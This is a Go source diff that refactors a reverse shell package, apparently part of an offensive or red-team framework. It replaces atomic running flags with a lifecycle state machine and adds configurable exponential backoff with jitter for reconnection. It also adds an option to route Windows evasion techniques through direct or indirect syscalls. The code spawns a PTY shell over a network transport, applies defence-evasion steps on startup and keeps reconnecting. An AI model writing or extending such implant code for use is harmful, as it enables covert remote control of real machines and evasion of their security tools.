@@ -9,7 +9,6 @@ import (
 	"os/exec"
 	"runtime"
 	"sync"
-	"sync/atomic"
 	"time"
 
 	"github.com/creack/pty"
@@ -35,6 +34,19 @@ type Config struct {
 
 	// Evasion holds evasion techniques to apply on startup. Ignored on non-Windows platforms.
 	Evasion []evasion.Technique
+
+	// Caller is an optional *wsyscall.Caller for routing evasion techniques
+	// through direct/indirect syscalls. Pass nil for standard WinAPI.
+	// Ignored on non-Windows platforms.
+	Caller evasion.Caller
+
+	// MaxBackoff is the ceiling for exponential backoff between reconnection
+	// attempts. Default: 5 minutes.
+	MaxBackoff time.Duration
+
+	// JitterFactor controls the random jitter applied to reconnect delays.
+	// 0.25 means +/-25% (default). Set to 0 to disable jitter.
+	JitterFactor float64
 }
 
 // DefaultConfig returns a sensible default configuration.
@@ -49,18 +61,18 @@ func DefaultConfig() *Config {
 		ShellArgs:     shellArgs,
 		MaxRetries:    0,
 		ReconnectWait: 5 * time.Second,
+		MaxBackoff:    5 * time.Minute,
+		JitterFactor:  0.25,
 	}
 }
 
 // Shell represents a reverse shell instance with automatic reconnection.
+// Lifecycle is managed by an internal state machine with phases:
+// Idle → Connecting → Connected → Running → Reconnecting → Stopped.
 type Shell struct {
 	config    *Config
 	transport transport.Transport
-	running   atomic.Bool
-	stopCh    chan struct{}
-	doneCh    chan struct{}
-	doneOnce  sync.Once
-	stopOnce  sync.Once
+	sm        *stateMachine
 }
 
 // New creates a new Shell with the given transport and config.
@@ -72,22 +84,34 @@ func New(trans transport.Transport, cfg *Config) *Shell {
 	return &Shell{
 		config:    cfg,
 		transport: trans,
-		stopCh:    make(chan struct{}),
-		doneCh:    make(chan struct{}),
+		sm:        newStateMachine(),
 	}
+}
+
+// CurrentPhase returns the current lifecycle phase (thread-safe).
+func (s *Shell) CurrentPhase() Phase {
+	return s.sm.Phase()
 }
 
 // Start runs the reverse shell with automatic reconnection.
 func (s *Shell) Start(ctx context.Context) error {
-	if !s.setRunning(true) {
-		return fmt.Errorf("shell already running")
+	s.sm.mu.Lock()
+	if err := s.sm.current.start(s.sm, ctx); err != nil {
+		s.sm.mu.Unlock()
+		return err
 	}
-	defer s.setRunning(false)
-	defer s.doneOnce.Do(func() { close(s.doneCh) })
+	s.sm.mu.Unlock()
+
+	defer func() {
+		s.sm.mu.Lock()
+		s.sm.transition(&stoppedState{})
+		s.sm.mu.Unlock()
+		s.sm.markDone()
+	}()
 
 	// Apply evasion techniques if configured.
 	if len(s.config.Evasion) > 0 {
-		if err := applyEvasion(s.config.Evasion); err != nil {
+		if err := applyEvasion(s.config.Evasion, s.config.Caller); err != nil {
 			fmt.Fprintf(os.Stderr, "[!] Evasion: %v\n", err)
 		}
 	}
@@ -100,7 +124,14 @@ func (s *Shell) reconnectLoop(ctx context.Context) error {
 	retries := 0
 	baseWait := s.config.ReconnectWait
 	currentWait := baseWait
-	maxWait := 5 * time.Minute
+	maxWait := s.config.MaxBackoff
+	if maxWait <= 0 {
+		maxWait = 5 * time.Minute
+	}
+	jitter := s.config.JitterFactor
+	if jitter < 0 {
+		jitter = 0
+	}
 
 	// First connection attempt is immediate.
 	if err := s.attemptSession(ctx); err != nil {
@@ -116,14 +147,24 @@ func (s *Shell) reconnectLoop(ctx context.Context) error {
 	}
 
 	for {
-		// Exponential backoff with jitter: +/-25%
-		jitter := time.Duration(rand.Int63n(int64(currentWait) / 4))
-		waitTime := currentWait + jitter - currentWait/8
+		s.sm.mu.Lock()
+		s.sm.transition(&reconnectingState{})
+		s.sm.mu.Unlock()
+
+		// Exponential backoff with configurable jitter
+		var waitTime time.Duration
+		if jitter > 0 && currentWait > 0 {
+			jitterRange := time.Duration(float64(currentWait) * jitter)
+			jitterOffset := time.Duration(rand.Int63n(int64(jitterRange)))
+			waitTime = currentWait + jitterOffset - jitterRange/2
+		} else {
+			waitTime = currentWait
+		}
 
 		select {
 		case <-ctx.Done():
 			return ctx.Err()
-		case <-s.stopCh:
+		case <-s.sm.stopCh:
 			return nil
 		case <-time.After(waitTime):
 			if s.shouldStop(retries) {
@@ -148,16 +189,28 @@ func (s *Shell) reconnectLoop(ctx context.Context) error {
 
 // attemptSession tries a complete session (connect + shell).
 func (s *Shell) attemptSession(ctx context.Context) error {
+	s.sm.mu.Lock()
+	s.sm.transition(&connectingState{})
+	s.sm.mu.Unlock()
+
 	if err := s.transport.Connect(ctx); err != nil {
 		return err
 	}
 	defer s.transport.Close()
+
+	s.sm.mu.Lock()
+	s.sm.transition(&connectedState{})
+	s.sm.mu.Unlock()
 
 	return s.runSession(ctx)
 }
 
 // runSession executes a shell session (PTY on Unix, direct I/O on Windows).
 func (s *Shell) runSession(ctx context.Context) error {
+	s.sm.mu.Lock()
+	s.sm.transition(&runningState{})
+	s.sm.mu.Unlock()
+
 	args := s.config.ShellArgs
 	cmd := exec.CommandContext(ctx, s.config.ShellPath, args...)
 
@@ -216,35 +269,21 @@ func (s *Shell) copyBidirectional(ptmx *os.File, cmd *exec.Cmd) error {
 
 // Stop gracefully stops the reverse shell.
 func (s *Shell) Stop() error {
-	if !s.running.Load() {
-		return fmt.Errorf("shell not running")
-	}
-
-	s.stopOnce.Do(func() {
-		close(s.stopCh)
-	})
-	return nil
+	s.sm.mu.Lock()
+	defer s.sm.mu.Unlock()
+	return s.sm.current.stop(s.sm)
 }
 
 // Wait blocks until the shell terminates.
 func (s *Shell) Wait() {
-	<-s.doneCh
+	<-s.sm.doneCh
 }
 
-// IsRunning returns true if the shell is currently running.
+// IsRunning returns true if the shell is in an active phase
+// (connecting, connected, running, or reconnecting).
 func (s *Shell) IsRunning() bool {
-	return s.running.Load()
-}
-
-// setRunning sets the running state in a thread-safe manner.
-func (s *Shell) setRunning(state bool) bool {
-	if state {
-		// CompareAndSwap returns true only if swapped from false to true,
-		// preventing double-start.
-		return s.running.CompareAndSwap(false, true)
-	}
-	s.running.Store(false)
-	return true
+	p := s.sm.Phase()
+	return p != PhaseIdle && p != PhaseStopped
 }
 
 // shouldStop checks if reconnection should stop.
